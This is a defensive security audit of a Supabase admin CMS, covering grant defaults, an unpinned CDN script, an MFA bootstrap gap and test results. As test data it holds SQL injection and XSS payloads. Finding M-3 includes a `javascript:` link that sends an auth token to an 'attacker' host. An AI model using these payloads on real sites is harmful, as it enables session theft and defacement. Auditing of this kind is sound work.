# Admin CMS Security Audit

**Target:** Portfolio Admin CMS (Supabase Auth + TOTP MFA + RLS + Storage)
**Branch:** `feature/admin-cms-v2`
**Audit date:** 2026-08-16
**Auditor role:** Senior Application Security Engineer
**Scope:** `admin/`, `supabase/migrations/`, `supabase/config.toml`, `supabase/functions/submit-comment/`, public JS using Supabase, repository hygiene, dependencies
**Method:** Read-only source review + automated black-box tests against **LOCAL Supabase only**

> **Production safety statement.** No production database change was made. `supabase db push` was never executed. No production Auth user was created or deleted. Nothing was deployed, committed, or pushed. `submit-comment` and the Guestbook tables were not modified. All destructive and write tests ran against the local Docker stack at `127.0.0.1:54321` and were cleaned up and verified empty. No secret, key, token, password, or TOTP seed appears anywhere in this document.

---

# Executive Summary

The security foundation of this Admin CMS is **well designed and, where implemented, it holds up under attack**. The core authorization model — *"you are the single owner in `app_private.admin_users` **and** your JWT is `aal2`"* — is enforced in the database, not in the browser. That is the single most important thing to get right, and it is right.

98 automated tests were executed against a clean local database built purely from the committed migrations. The results were decisive:

- **Anonymous visitors cannot read Draft, Archived, or Trashed content**, and cannot reach it through child tables, PostgREST filters, `or()` predicates, or resource embedding.
- **Authenticated non-owner accounts have zero write access** and cannot see unpublished content.
- **The owner at `aal1` is denied every CMS write and every Storage operation** — proving MFA is enforced server-side, not merely in the UI.
- **The owner at `aal2` gets exactly the intended CRUD**, and no more.
- **`app_private` is invisible** to the Data API for anon, non-owner, and even the owner at `aal2`.
- **SQL- and XSS-shaped payloads never altered query structure and never executed.** A `'; DROP TABLE projects; --` payload was stored as an inert string; the table was intact afterwards.
- **MFA cannot be self-escalated.** An `aal1` session was blocked from enrolling a second factor (`insufficient_aal`), blocked from unenrolling the existing factor, and blocked from changing the password.

That said, this is a **foundation-stage build**, and the audit surfaced real issues. Three are HIGH.

The most consequential is not in the code that exists — it is in the **inherited database baseline**. `20260815212736_remote_schema.sql` contains `ALTER DEFAULT PRIVILEGES ... GRANT DELETE, INSERT, SELECT, UPDATE ON TABLES TO anon`. I verified empirically that **any new table created in `public` is born with `DELETE, INSERT, SELECT, UPDATE, TRUNCATE, TRIGGER, REFERENCES` granted to `anon` and with RLS switched off**. The current CMS tables are safe only because the RLS migration explicitly revokes those grants afterwards. The next table someone adds without remembering that ritual is world-writable by unauthenticated visitors. This is a loaded footgun aimed at every future migration.

Second, the admin login page loads `supabase-js` from a public CDN at a **floating major version with no Subresource Integrity and no Content-Security-Policy**. This is the page that handles the password and the TOTP code. A bad `@2` release or a CDN compromise yields the admin account outright.

Third, there is a **genuine MFA bootstrap window**: while the owner has no TOTP factor enrolled, a password alone is sufficient to self-enroll a factor and reach `aal2`. The application's own `routeSession()` implements exactly this path. Until first enrollment, the password *is* the whole authentication system.

I also found a **configuration defect that currently breaks admin login entirely**: `[auth.email] enable_signup = false` maps to `GOTRUE_EXTERNAL_EMAIL_ENABLED=false`, which disables email logins — not just signups. I confirmed this in the running container. Sign-in returns `email_provider_disabled`. This fails closed, so it is not a vulnerability, but if this config is ever pushed to production it locks the owner out of the CMS permanently.

Finally, large parts of the specified system **do not exist yet**: there is no CMS data layer, no content rendering, and no image upload/re-encode pipeline. Per the audit brief these are reported as **NOT IMPLEMENTED**, not as vulnerabilities. But it means the XSS and Upload verdicts are provisional — the dangerous sinks have not been written yet, and the database currently accepts `javascript:` and `data:text/html` values into `demo_url`/`github_url`, which will become stored XSS the moment a renderer assigns them to an `href`.

**Bottom line:** the security architecture is sound and materially better than typical for a personal project. The authorization core is production-grade. The blockers are a hazardous inherited grant baseline, an unpinned CDN on the auth page, and a large amount of unbuilt surface area.

---

# Security Score

| Area | Rating | Basis |
|------|--------|-------|
| **Authentication** | **PASS** | Server-verified `getUser()`, signup disabled, non-owner rejected and signed out, no privileged UI before the auth check. One config defect currently disables email login (M-1). |
| **MFA** | **WARNING** | `aal2` is enforced in the database and cannot be self-escalated. Deducted for the pre-enrollment bootstrap window (H-3). |
| **RLS** | **PASS** | 40/40 RLS tests passed. Draft/Archived/Trash hidden from anon, non-owner, and owner-`aal1`; no child-table leakage; `app_private` unreachable. |
| **Storage** | **WARNING** | Owner+`aal2` gating and `.webp` extension enforcement verified. Deducted for extension-only validation with no content inspection (M-5) and dashboard-only production bucket settings. |
| **Secret Management** | **PASS** | No secret in the repo or in full Git history. Frontend carries only project URL, publishable key, and owner UUID — all permitted. |
| **XSS** | **NOT IMPLEMENTED** | No CMS rendering code exists to audit. Existing public JS correctly uses `textContent`; every `innerHTML` is a static literal. URL-scheme gap (M-3) pre-stages a future stored XSS. |
| **Injection** | **PASS** | No SQL concatenation, no dynamic RPC SQL, no user-controlled identifiers. All attack payloads stored inert; RLS held under filter/embedding manipulation. |
| **Upload Security** | **NOT IMPLEMENTED** | No image processor exists. No decode, re-encode, dimension, or size logic present. |
| **Dependency Security** | **WARNING** | `npm audit`: 0 vulnerabilities; `npm outdated`: none. Deducted for unpinned CDN `supabase-js@2` with no SRI on the auth page (H-2). |
| **Production Auth Hardening** | **MANUAL TEST REQUIRED** | Production Auth/Storage settings are dashboard-managed and cannot be verified from the repo. |
| **OVERALL** | **WARNING** | Sound core, three HIGH findings, significant unbuilt surface. |

---

# Critical Findings

**None.**

No finding in this audit is remotely exploitable against the current production surface by an unauthenticated attacker holding only the publishable key. The three HIGH findings below require either a third-party compromise, a future code change, or prior knowledge of the owner password.

---

# High Findings

### H-1 — Inherited `ALTER DEFAULT PRIVILEGES` makes every future `public` table anon-writable with RLS off

**File:** `supabase/migrations/20260815212736_remote_schema.sql:7-23`
**Category:** `authorization` / `insecure-default`
**Status:** Empirically confirmed on local Supabase

The captured remote baseline contains:

```sql
ALTER DEFAULT PRIVILEGES FOR ROLE postgres IN SCHEMA public
  GRANT DELETE, INSERT, SELECT, UPDATE ON TABLES TO anon;
ALTER DEFAULT PRIVILEGES FOR ROLE postgres IN SCHEMA public
  GRANT ALL ON ROUTINES TO anon;
-- (repeated for authenticated)
```

I created a table in `public` as `postgres` on the local stack and inspected the resulting grants:

```
grantee       | privs
--------------+---------------------------------------------------------
anon          | DELETE,INSERT,REFERENCES,SELECT,TRIGGER,TRUNCATE,UPDATE
authenticated | DELETE,INSERT,REFERENCES,SELECT,TRIGGER,TRUNCATE,UPDATE

rls_enabled: f
```

A brand-new table is born **fully writable by unauthenticated visitors, with RLS disabled**. `GRANT ALL ON ROUTINES TO anon` does the same for every new function.

The 13 current CMS tables are safe *only* because `20260815213442_admin_cms_rls.sql:55-69` explicitly revokes these grants and enables RLS. That is a manual ritual that must be repeated perfectly, forever, in every future migration. `supabase/config.toml:24` leaves `auto_expose_new_tables` commented out — signalling the correct intent — but the database-level `ALTER DEFAULT PRIVILEGES` overrides that intent entirely.

**Exploit scenario:** A future migration adds `public.contact_submissions` and the author forgets `enable row level security` and the `revoke`. Any visitor with the publishable key immediately reads every submission, rewrites them, and deletes them via `DELETE /rest/v1/contact_submissions`. No authentication required.

**Additional exposure window (today):** `20260815213435_admin_cms_schema.sql` creates all 13 tables, and RLS is only enabled in the *next* migration file. Migration files are applied in separate transactions. Between those two files the CMS tables exist in `public` with full anon DML and no RLS. If the RLS migration fails mid-deploy, the database is left in that state.

**Recommendation:** Add a new migration that reverses the defaults, then re-establish least privilege explicitly:

```sql
ALTER DEFAULT PRIVILEGES FOR ROLE postgres IN SCHEMA public
  REVOKE ALL ON TABLES FROM anon, authenticated;
ALTER DEFAULT PRIVILEGES FOR ROLE postgres IN SCHEMA public
  REVOKE ALL ON ROUTINES FROM anon, authenticated;
```

Do **not** edit the applied baseline migration. Additionally, consider merging schema creation and RLS enablement into one transactional migration for future tables, and add a CI assertion that every table in `public` has `relrowsecurity = true`.

---

### H-2 — Admin auth page loads `supabase-js` from a CDN at a floating version, with no SRI and no CSP

**File:** `admin/index.html:1`
**Category:** `supply-chain` / `credential-theft`

```html
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
```

Three compounding problems on the page that handles the admin password and TOTP code:

1. **Floating major version.** `@2` resolves to whatever the latest 2.x is at page load. The code executing in the admin's browser is not pinned and not reviewed.
2. **No Subresource Integrity.** I confirmed there is no `integrity=` attribute anywhere in the repository. The browser will execute whatever bytes the CDN returns.
3. **No Content-Security-Policy.** `admin/index.html` has no `<!DOCTYPE html>`, no `<html>`, no `<head>`, no `<meta charset>`, and no CSP. The page also renders in **quirks mode**.

Session tokens are held in `localStorage` (supabase-js default with `persistSession: true`), so any script running on this origin can read the `aal2` access token and refresh token directly.

**Exploit scenario:** A malicious or compromised `@supabase/supabase-js` 2.x release, or a jsDelivr compromise, ships JavaScript that wraps `signInWithPassword` and `mfa.verify`. On the owner's next login it exfiltrates the email, password, and the live TOTP code — and can simply read the `aal2` token out of `localStorage`. TOTP provides no protection because the attacker's code runs inside the authenticated session. Result: complete CMS compromise, including write access to the public portfolio and to both Storage buckets.

**Recommendation:** Vendor `supabase-js` locally and serve it from the same origin (strongly preferred for an admin console), or at minimum pin an exact version and add `integrity` + `crossorigin="anonymous"`. Add a proper document structure with a strict CSP:

```
default-src 'none';
script-src 'self';
connect-src https://<project-ref>.supabase.co;
img-src 'self' data:;
style-src 'self';
base-uri 'none';
form-action 'none';
frame-ancestors 'none'
```

Note the QR code is delivered as a `data:` URI, hence `img-src data:`.

---

### H-3 — MFA bootstrap window: password alone reaches `aal2` before the first factor is enrolled

**Files:** `admin/admin.js:88-94`, `admin/admin.js:99-123`
**Category:** `authentication-bypass`
**Status:** Empirically confirmed

`routeSession()` routes an owner whose session is `aal1/aal1` — meaning no TOTP factor exists — straight into `startEnrollment()`:

```js
if (aal.currentLevel === "aal1" && aal.nextLevel === "aal1") {
  await startEnrollment();
  return;
}
```

I reproduced the full chain locally against a fresh owner account with zero factors:

| Step | Result |
|------|--------|
| Password-only sign-in | `aal1` |
| `POST /factors` (enroll TOTP) from `aal1` | **200 — allowed** |
| `POST /factors/{id}/verify` from `aal1` | **`aal2` issued** |

So while no factor is enrolled, **knowledge of the password is sufficient for full owner + `aal2` access**, which is the complete CMS authority.

The good news, and it is genuinely good: **once a factor is enrolled this window slams shut**, and I verified that server-side rather than trusting the design:

| Attack from an `aal1` session with a verified factor present | Result |
|---|---|
| Enroll a *second* TOTP factor | **403 `insufficient_aal` — "AAL2 required to enroll a new factor"** |
| Unenroll the existing factor (MFA strip) | **422 — denied** |
| Change the account password | **401 — denied** |
| Read Draft content | **0 rows** |

This is a bootstrap problem, not a design flaw — but it is live right now, because the migration seed deliberately leaves `app_private.admin_users` empty and MFA unenrolled (`20260815213451_admin_cms_seed.sql:20-27`).

**Exploit scenario:** The owner password is phished, reused from a breach, or guessed (production password policy is unverified — see M-6). Before the owner completes TOTP enrollment, the attacker signs in, enrolls *their own* authenticator, reaches `aal2`, and owns the CMS. The legitimate owner is then locked out of enrollment and may not notice for some time.

**Recommendation:** Enroll TOTP **immediately** — in the same session in which the owner row is inserted into `app_private.admin_users`, before the account is reachable from the public internet. Treat the bootstrap as a one-time, offline operation. For defence in depth, consider gating enrollment behind a short-lived flag, and enable Auth email notifications for factor enrollment so unexpected enrollment is visible.

---

# Medium Findings

### M-1 — `[auth.email] enable_signup = false` disables email **logins**, not just signups (breaks admin login; lockout risk)

**File:** `supabase/config.toml:221`
**Category:** `configuration` / `availability`
**Status:** Empirically confirmed

The Supabase CLI maps `auth.email.enable_signup` to `GOTRUE_EXTERNAL_EMAIL_ENABLED`, which controls the **email provider as a whole**. Verified in the running container:

```
GOTRUE_EXTERNAL_EMAIL_ENABLED=false
GOTRUE_DISABLE_SIGNUP=true
```

`POST /auth/v1/token?grant_type=password` returns:

```json
{"code":422,"error_code":"email_provider_disabled","msg":"Email logins are disabled"}
```

`signInWithPassword` **cannot succeed** under the committed configuration. This fails closed, so it is not a vulnerability — but it has two real consequences:

1. The local environment does not faithfully mirror production, so local security testing silently diverges from reality.
2. If this config is ever applied to production (`supabase config push`), **the owner is permanently locked out of the Admin CMS.**

The correct knob is already set: top-level `[auth] enable_signup = false` at `supabase/config.toml:176` produces `GOTRUE_DISABLE_SIGNUP=true`, which blocks registration while preserving password login. I verified both properties simultaneously — signup returned 422 while password login succeeded.

**Recommendation:** Set `[auth.email] enable_signup = true` and rely on top-level `[auth] enable_signup = false` to block registration. (Note: this line also carries a trailing space.)

---

### M-2 — `anon` holds `TRUNCATE` on the Guestbook tables, and RLS does not govern `TRUNCATE`

**Files:** `supabase/migrations/20260815212736_remote_schema.sql:7-23` (root cause), affecting `public.comments` and `public.guestbook_rate_limits`
**Category:** `authorization`
**Status:** Empirically confirmed (tested on a throwaway replica table — the protected Guestbook tables were **not** touched)

Current grants:

| Table | RLS | `anon` privileges | Policies |
|---|---|---|---|
| `comments` | on | `DELETE, INSERT, REFERENCES, SELECT, TRIGGER, TRUNCATE, UPDATE` | 1 (SELECT only) |
| `guestbook_rate_limits` | on | `DELETE, INSERT, REFERENCES, SELECT, TRIGGER, TRUNCATE, UPDATE` | 0 |

RLS correctly blocks anon `INSERT`/`UPDATE`/`DELETE`. **But PostgreSQL RLS does not apply to `TRUNCATE`.** I built a throwaway table with the identical grant shape and confirmed:

```
anon INSERT   -> ERROR: new row violates row-level security policy
anon DELETE   -> DELETE 0        (blocked by RLS)
anon TRUNCATE -> TRUNCATE TABLE  (SUCCEEDED — 3 rows -> 0 rows)
```

**Why this is Medium and not High:** PostgREST exposes no HTTP verb that maps to `TRUNCATE`, and `anon` is not a login role, so there is no direct path from the internet today. It becomes exploitable if any `SECURITY INVOKER` function reachable via `/rpc/` issues a `TRUNCATE`, or if RLS is momentarily disabled during maintenance.

The CMS tables are **not** affected — the RLS migration's `revoke all` stripped these privileges, leaving `anon` with `SELECT` only. This finding is confined to the inherited Guestbook baseline.

**Recommendation:** In a **new** migration (do not edit the applied one, and do not alter Guestbook logic or `submit-comment`):

```sql
REVOKE ALL ON TABLE public.comments, public.guestbook_rate_limits FROM anon, authenticated;
GRANT SELECT ON TABLE public.comments TO anon, authenticated;
```

This preserves the existing public read behaviour exactly while removing the RLS-bypassing privilege. Verify the Guestbook still functions before applying to production.

---

### M-3 — No URL-scheme validation on link columns (`javascript:` and `data:text/html` accepted)

**Files:** `supabase/migrations/20260815213435_admin_cms_schema.sql:151-152` (`github_url`, `demo_url`)
**Category:** `stored-xss` (pre-staged)
**Status:** Empirically confirmed

Both columns are bare `text` with no `CHECK` constraint. As owner + `aal2`, all of these inserted successfully with HTTP 201:

| Payload | Result |
|---|---|
| `javascript:alert(1)` | **201 accepted** |
| `data:text/html,<script>alert(1)</script>` | **201 accepted** |
| `vbscript:msgbox(1)` | **201 accepted** |
| `  javascript:alert(1)` (leading whitespace) | **201 accepted** |

There is no XSS today because nothing renders these values yet. But the unsafe sink pattern **already exists in the codebase** — `js/certificates.js:364` performs `link.href = cert.link` with no scheme validation (currently fed by a hardcoded array). When the CMS is wired into the public site, that exact line becomes a stored-XSS trigger.

Contrast with `slug`, which is properly constrained by `projects_slug_check` — the pattern to follow is already established in this schema.

**Exploit scenario:** A `demo_url` of `javascript:fetch('//attacker/'+localStorage.getItem('sb-...-auth-token'))` is stored, then rendered into an `href` on the public project page. Any visitor who clicks it executes attacker JavaScript on the portfolio origin.

**Recommendation:** Add a `CHECK` constraint in a new migration, and validate again at render time:

```sql
ALTER TABLE public.projects
  ADD CONSTRAINT projects_github_url_scheme_check
  CHECK (github_url IS NULL OR github_url ~* '^https://'),
  ADD CONSTRAINT projects_demo_url_scheme_check
  CHECK (demo_url IS NULL OR demo_url ~* '^https://');
```

At render time, parse with `new URL(value)` and allow only `https:`, rather than string-prefix checking.

---

### M-4 — Root `.gitignore` does not ignore `.env`

**File:** `.gitignore:1-3`
**Category:** `secret-management` (preventive)

The root `.gitignore` contains only:

```
node_modules/
.venv/
__pycache__/
```

`supabase/.gitignore` covers `.env.keys`, `.env.local`, and `.env.*.local` — but **not plain `.env`**, and only inside `supabase/`.

I confirmed **no `.env` file currently exists** anywhere in the working tree, none is tracked, and a scan of the **entire Git history** across all branches found no service-role key, secret key, JWT, database URL with credentials, or TOTP seed. The repository is clean today.

This is purely preventive: the moment anyone creates a root `.env` for Supabase CLI credentials or an access token, `git add .` will stage it.

**Recommendation:** Add to root `.gitignore`:

```
.env
.env.*
!.env.example
supabase/.temp/
supabase/.branches/
```

(The last two are already ignored by `supabase/.gitignore` and are correctly untracked — listing them at root is belt-and-braces.)

---

### M-5 — Storage validates only the filename extension; no content inspection

**File:** `supabase/migrations/20260815213447_admin_cms_storage_policies.sql:25,39`
**Category:** `file-upload`

The policy check is `lower(storage.extension(name)) = 'webp'`. Verified behaviour as owner + `aal2`:

| Test | Result |
|---|---|
| `evil.html` uploaded with `Content-Type: image/webp` | **400 — rejected** (extension check works) |
| `audit/evil.html.webp` (double extension) | **200 — accepted** |
| Raw HTML bytes `<html><script>alert(1)</script></html>` named `.webp` | **200 — accepted** |
| Retrieval of that object from the public bucket | Served as `Content-Type: image/webp` |

**Mitigating factors, which are significant:** the object is served with `image/webp`, so browsers will not render it as HTML; only owner + `aal2` can upload at all; and `supabase/config.toml:416-424` sets `allowed_mime_types = ["image/webp"]` and `file_size_limit = "5MB"` on both buckets.

**The real gap:** those bucket restrictions live in **local** `config.toml`. The migration header (lines 2-5) explicitly says buckets are created "through Supabase Dashboard", meaning the production bucket's MIME and size limits are **manually configured and unverifiable from this repository**. Content-Type is also client-supplied and therefore attacker-controlled in principle.

**Recommendation:** Confirm production bucket settings match `config.toml` (see MT-3). Enforce the WebP magic-byte signature (`RIFF....WEBP`) client-side before upload, tighten the policy to also reject double extensions, and generate storage paths server-side rather than accepting arbitrary client-supplied object names.

---

### M-6 — Weak password policy and no session limits in the committed configuration

**File:** `supabase/config.toml:182-185, 228, 272-276, 213-217`
**Category:** `authentication-hardening`

| Setting | Value | Concern |
|---|---|---|
| `minimum_password_length` | `6` | Very weak for the sole account holding total CMS authority |
| `password_requirements` | `""` | No complexity requirement |
| `secure_password_change` | `false` | Password change does not require recent reauthentication |
| `[auth.sessions]` timebox / inactivity | commented out | Sessions never force-expire |
| `[auth.captcha]` | commented out | No bot protection on the login endpoint |

These directly compound H-3: a 6-character password is the entire authentication system during the bootstrap window.

**Partial mitigations verified:** `[auth.rate_limit] sign_in_sign_ups = 30` per 5 minutes per IP limits online guessing; `enable_refresh_token_rotation = true`; `jwt_expiry = 3600`; and I confirmed an `aal1` session cannot change the password (401) once MFA is enrolled.

**Note:** these are local settings. Production Auth configuration is dashboard-managed — see MT-1.

**Recommendation:** Set `minimum_password_length = 12` and `password_requirements = "lower_upper_letters_digits_symbols"`, set `secure_password_change = true`, enable `[auth.sessions] timebox = "24h"` and `inactivity_timeout = "8h"`, and mirror all of it in the production dashboard.

---

# Low Findings

### L-1 — `detectSessionInUrl: true` is unnecessary for this auth flow
**File:** `admin/js/core/supabase.js:15`
The CMS uses only password + TOTP. There is no OAuth callback and no magic link, so URL-fragment session detection serves no purpose and needlessly widens the surface for token-in-URL handling. Set it to `false`.

### L-2 — `aal2` tokens remain valid for up to one hour after logout
**File:** `supabase/config.toml:165`
`signOut()` clears local storage and revokes the refresh token, but the already-issued JWT stays cryptographically valid until `jwt_expiry` (3600s) elapses. An exfiltrated `aal2` token is usable for up to an hour after the owner logs out. Inherent to stateless JWTs; reduce `jwt_expiry` (e.g. 900) to shrink the window.

### L-3 — Owner cannot delete technologies (functional gap, not a vulnerability)
**Files:** `20260815213442_admin_cms_rls.sql:105`, `:276-283`
`technologies` is granted only `insert, update` and has no `DELETE` policy. Verified: owner + `aal2` `DELETE` returns 403. With `project_technologies.technology_id` using `on delete restrict`, obsolete technologies can never be removed. Deliberate conservatism, but it will surface as a CMS bug.

### L-4 — `hero_media` rows cannot be created or removed
**Files:** `20260815213442_admin_cms_rls.sql:87-91`
Only `UPDATE` is granted. Verified: owner + `aal2` `INSERT` and `DELETE` both return 403. Slots are permanently fixed at the three rows created by the seed. This is a sound design (it makes the 3-slot invariant structural), and the `WITH CHECK` correctly blocks moving a row to slot 4 — but it should be documented as intentional so it is not "fixed" later.

### L-5 — Inactive technologies are publicly readable
**File:** `20260815213442_admin_cms_rls.sql:185-197`
The policy is `is_active = true OR <used by a published project>`. A technology with `is_active = true` is readable even if it is only attached to Draft projects. Impact is minimal (technology names, not content), and I verified the intended case: an **inactive** technology used only by a Draft project was correctly hidden from anon. Consider whether `is_active = true` alone should imply public visibility.

### L-6 — `admin/admin.css` is empty; screen gating relies solely on the `hidden` attribute
**File:** `admin/admin.css` (0 bytes)
Screen switching depends entirely on `hidden` and the browser's default `display: none`. Combined with the missing `<!DOCTYPE html>` (H-2) putting the page in **quirks mode**, this is fragile. Any future CSS rule setting `display` on these sections would override `hidden` and render privileged UI. Add `[hidden] { display: none !important; }` and a doctype.

### L-7 — Auth error objects logged to the browser console
**Files:** `admin/admin.js:67`, `admin/admin.js:107`
`console.error(error)` writes Supabase error objects to the console. No credential or token is logged, and user-facing messages are correctly generic ("Invalid email or password"), which avoids account enumeration. Minor information disclosure only.

---

# Passed Controls

Each item below was verified — by reading the code, by executing a test, or both.

**Authentication**
- Session is validated server-side via `auth.getUser()` (`admin/js/core/auth.js:15-26`), not the spoofable local-storage `getSession()`.
- Loading screen renders first; every privileged section carries `hidden` (`admin/index.html:44-108`). No privileged UI before the auth check completes.
- Non-owner is rejected **and** signed out (`admin/admin.js:55-59`).
- Public signup disabled — verified: `POST /auth/v1/signup` returned 422 while password login succeeded in the same run.
- Anonymous sign-ins disabled; manual account linking disabled (`config.toml:178-180`).
- `persistSession: true` and `autoRefreshToken: true` configured; refresh of an `aal2` session preserves `aal2` (verified).
- Logout wired to `signOut()`; `onAuthStateChange` returns to the login screen on `SIGNED_OUT`.
- Generic error messages prevent account enumeration.

**MFA**
- Full TOTP lifecycle implemented: enroll → challenge → verify (`auth.js:37-65`).
- `getAuthenticatorAssuranceLevel()` drives routing, with all four `currentLevel`/`nextLevel` combinations handled and a fail-closed `signOut()` default (`admin.js:72-98`).
- **MFA is enforced in the database, not the browser** — the decisive result: owner at `aal1` was denied every CMS INSERT/UPDATE/DELETE and every Storage operation, at the API level, with no UI involved.
- Invalid TOTP code rejected (422).
- `aal1` cannot enroll a second factor (403 `insufficient_aal`), cannot unenroll the existing factor (422), and cannot change the password (401).
- Phone and WebAuthn MFA disabled; TOTP only (`config.toml:302-317`).

**RLS**
- RLS enabled on **all 13** CMS tables — verified directly against `pg_class.relrowsecurity`.
- Draft, Archived, and soft-deleted (`deleted_at`) projects hidden from anon, non-owner, and owner-`aal1`.
- Draft experiences hidden.
- **No child-table leakage:** `project_paragraphs`, `project_media`, `experience_tags`, and `project_technologies` all correctly gate on parent `status = 'published' AND deleted_at IS NULL`. A canary string planted in a Draft paragraph was never returned.
- Authorization helper functions are `SECURITY DEFINER` with `SET search_path = ''` and fully qualified references — correctly immune to search-path hijacking.
- `EXECUTE` revoked from `PUBLIC`, granted only to `authenticated`.
- `app_private` excluded from `config.toml:13` exposed schemas; `admin_users` returns 404 through the Data API for anon, non-owner, **and owner-`aal2`**; the helper function is not callable via `/rpc/`.
- Single-owner invariant enforced structurally by `admin_users_singleton_key_unique` — a second admin row was rejected.
- Owner + `aal2` CRUD works as intended: project INSERT/UPDATE, `profile_content` UPDATE, `about_organization` UPDATE, `hero_media` slot UPDATE, and full visibility of Draft/Archived/Trash.
- No `USING (true)` on any privileged operation. The two `USING (true)` policies are `SELECT`-only on intentionally public singleton content.
- No policy grants `anon` any write capability.

**Storage**
- `portfolio-staging` is private: anon read of a **real, existing** object returned 400; non-owner and owner-`aal1` reads denied.
- Upload denied for anon, non-owner, and owner-`aal1` on both buckets.
- Owner + `aal2` upload, read, and delete all succeed.
- `.webp` extension enforced — `evil.html` rejected at 400.
- `portfolio-media` public retrieval works by design (200) while writes stay owner + `aal2`.
- **Path traversal blocked:** an encoded `../portfolio-media/escaped.webp` upload was rejected (400) and created no object in the public bucket.
- Buckets declared in `config.toml` with `allowed_mime_types = ["image/webp"]` and `file_size_limit = "5MB"`.

**Injection**
- Zero SQL string concatenation anywhere in the repository.
- No dynamic RPC SQL, no user-controlled table or column names, no raw PostgREST filter construction from user input.
- `'; DROP TABLE projects; --` stored byte-identically as an inert string; `projects` confirmed intact afterwards.
- `' OR '1'='1`, `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>` all round-tripped verbatim with no structural effect.
- **RLS held under adversarial PostgREST manipulation:** `?status=eq.draft` → 0 rows; `?or=(status.eq.draft,status.eq.archived)` → 0 rows; resource embedding `?select=*,project_paragraphs(content)` → Draft canary absent.
- Guestbook reads use a fixed, non-interpolated endpoint (`js/guestbook.js:1046-1050`).

**XSS (existing public code)**
- All user-controlled Guestbook content rendered with `textContent` (`js/guestbook.js:911, 945`) — with an explicit in-code comment warning against `innerHTML`.
- Every `innerHTML` assignment in the repository is a **static literal** with no interpolation (`guestbook.js:571, 1100, 1197, 1435`; `script.js:1200`; `experience-stack.js:101`) — each verified by reading its surrounding context.
- Dynamic elements built with `createElement` + `textContent`.
- `js/certificates.js:366-367` correctly applies `rel="noopener noreferrer"` on external links.
- The MFA QR image `src` is a Supabase-generated `data:` URI, and the TOTP secret is written with `textContent` (`admin.js:116-120`).

**Secret Management**
- No service-role key, secret key, database password, access token, refresh token, or TOTP seed anywhere in the working tree.
- **Full Git history scanned across all branches** — clean. The only matches were `Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")` (correct server-side usage) and `sb_secret_...` placeholders in documentation.
- Frontend contains only the three permitted values: project URL, publishable key, owner UUID (`admin/js/core/config.js`).
- **Publishable vs. secret, explicitly distinguished:** `sb_publishable_...` is designed for browser exposure and carries no authority of its own — every request it makes is still subject to RLS, which this audit confirms is enforced. The owner UUID is a non-secret identifier used only as a UX guard; real authority comes from `app_private.admin_users` server-side. Neither is a finding.
- `submit-comment` reads the service-role key from `Deno.env` only, never returns it, and is invoked exclusively server-side.
- `config.toml` uses `env(...)` substitution for every sensitive value.

**Repository**
- Branch confirmed: `feature/admin-cms-v2`.
- No `.env` file exists or is tracked.
- `supabase/.temp` and `supabase/.branches` exist on disk, are correctly ignored, and are **not** tracked.
- **No applied migration file was modified** — verified via `git status` at start and end.
- No production credentials in any documentation file.
- Nothing was committed or pushed.

**Dependencies**
- `npm audit`: **0 vulnerabilities** (info 0, low 0, moderate 0, high 0, critical 0).
- `npm outdated`: no outdated packages.
- Only two devDependencies (`sharp@0.35.3`, `supabase@2.114.0`); neither ships to the browser.

**Protected subsystems — untouched**
- `supabase/functions/submit-comment/index.ts` — not modified.
- `public.comments`, `public.guestbook_rate_limits` — not modified (M-2 is a **report**, tested on a throwaway replica table).
- Public Portfolio V1 — not modified.

---

# Automated Test Results

**Environment:** Local Supabase only (`http://127.0.0.1:54321`), Docker 29.7.2, Supabase CLI 2.114.0, PostgreSQL 17.
**Database state:** `supabase db reset` (local) — all 5 migrations applied cleanly from scratch.
**Total: 98 tests — 96 passed, 2 findings confirmed** (both reported above as M-3; the two initial "failures" in run 1 were one malformed test and one real finding, both resolved in run 2).

### 1. Anonymous visitor

| Test | Expected | Actual | Result |
|------|----------|--------|--------|
| Published project SELECT allowed | visible | visible | PASS |
| Draft project SELECT returns no row | hidden | hidden | PASS |
| Archived project hidden | hidden | hidden | PASS |
| Trashed (`deleted_at`) project hidden | hidden | hidden | PASS |
| Draft experience hidden | hidden | hidden | PASS |
| `project_paragraphs` do not leak Draft parent | canary absent | hidden | PASS |
| `experience_tags` do not leak Draft parent | absent | hidden | PASS |
| `project_media` do not leak Draft parent | absent | hidden | PASS |
| `project_technologies` do not leak Draft parent | absent | hidden | PASS |
| Inactive tech used only by Draft hidden | absent | hidden | PASS |
| CMS INSERT denied | >=400 | 401 | PASS |
| CMS UPDATE denied | >=400 | 401 | PASS |
| CMS DELETE denied | >=400 | 401 | PASS |
| Published row unchanged after write attempts | unchanged | unchanged | PASS |
| `profile_content` UPDATE denied (filtered) | denied | 401 | PASS |
| `app_private.admin_users` via Data API | >=400 | 404 | PASS |
| `app_private` helper fn via `/rpc/` | >=400 | 404 | PASS |
| Staging Storage read denied | >=400 | 400 | PASS |
| Staging read of a **real existing** object denied | >=400 | 400 | PASS |
| Staging Storage upload denied | >=400 | 400 | PASS |
| `portfolio-media` upload denied | >=400 | 400 | PASS |
| `portfolio-media` public retrieval (by design) | 200 | 200 | PASS |

### 2. Authenticated non-owner

| Test | Expected | Actual | Result |
|------|----------|--------|--------|
| Token role is `authenticated` | authenticated | authenticated | PASS |
| Draft project read denied | hidden | hidden | PASS |
| CMS INSERT denied | >=400 | 403 | PASS |
| CMS UPDATE denied | 0 rows | 200 / 0 rows | PASS |
| CMS DELETE denied | 0 rows | 200 / 0 rows | PASS |
| `app_private.admin_users` unreachable | >=400 | 404 | PASS |
| Staging upload denied | >=400 | 400 | PASS |
| Staging read denied | >=400 | 400 | PASS |

### 3. Owner at AAL1 (MFA not satisfied)

| Test | Expected | Actual | Result |
|------|----------|--------|--------|
| Password sign-in yields `aal1` | aal1 | aal1 | PASS |
| CMS INSERT denied | >=400 | 403 | PASS |
| CMS UPDATE denied | 0 rows | 200 / 0 rows | PASS |
| CMS DELETE denied | 0 rows | 200 / 0 rows | PASS |
| Draft project read denied | hidden | hidden | PASS |
| `profile_content` UPDATE denied (filtered) | 0 rows | 200 / 0 rows | PASS |
| Storage upload denied | >=400 | 400 | PASS |
| Storage read denied | >=400 | 400 | PASS |

### 4. Owner at AAL2 (intended access)

| Test | Expected | Actual | Result |
|------|----------|--------|--------|
| TOTP verify elevates to `aal2` | aal2 | aal2 | PASS |
| Invalid TOTP code rejected | >=400 | 422 | PASS |
| Refresh preserves `aal2` | aal2 | aal2 | PASS |
| Can read Draft / Archived / Trash | all 4 visible | 4 of 4 | PASS |
